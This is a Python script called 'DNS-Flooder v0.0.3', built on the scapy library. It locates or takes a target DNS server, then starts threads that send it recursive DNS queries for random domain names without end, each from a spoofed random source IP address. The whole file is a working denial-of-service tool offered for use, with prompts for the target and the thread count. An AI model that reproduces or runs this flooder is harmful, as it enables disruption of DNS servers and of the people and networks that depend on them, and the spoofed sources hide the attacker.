from scapy.all import *
import find_ns as fns
from time import sleep
import random
import string
import threading

threads = 4
answ = False

def perform_query(dns, domain, sourceIP):
    packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet)

def getRandDomain():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(6))

def getRandomIP():
    genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
    return genIP

def flood(): 
    while True:
        global answ
        domainToUse = getRandDomain()
        ipToUse = getRandomIP()
        try:
            answ = perform_query(userDNS, f"{domainToUse}.com", ipToUse)
        except:
            domainToUse = getRandDomain()

def startThreads():
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

print("DNS-Flooder v0.0.3")
sleep(1)
print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
sleep(1)

userSearchDNS = input(f"Want to search for the DNS Server? (y|N): ")

if userSearchDNS == "y":
    userSuppliedRange = input(f'Specify IP Range (f.E. "10.0.0.0"): ')
    userSuppliedStart = input(f'Start at: ')
    userSuppliedEnd = input(f'End at (f.E. "1" for "10.0.0.1"): ')
    answ = fns.getByIPRange(userSuppliedRange, int(userSuppliedStart), int(userSuppliedEnd))
    if answ is not False:
        sleep(1)
        print(f"Automatically using {answ} as target!")
        sleep(1)
    else:
        print("No DNS-Server was found at specified IP-range!")
        sleep(1)
        print("Returning to manual setup!")
        sleep(1)
else:
    print("Searching declined!")
    sleep(1)

if answ is False:
    userDNS = input("Specify DNS Server to use: ")
else:
    userDNS = answ

userThreads = input(f"Specify Threads to use (def {threads}): ")

if userThreads == '':
    print(f"Using Default Threads count of {threads}")
    sleep(0.5)
else:
    print(f"Using Threads count of {userThreads}")
    threads = int(userThreads)
    sleep(0.5)

print(f"Starting Flood of {userDNS} in 3 seconds ...")
sleep(3)
print(f"Flooding...")

startThreads()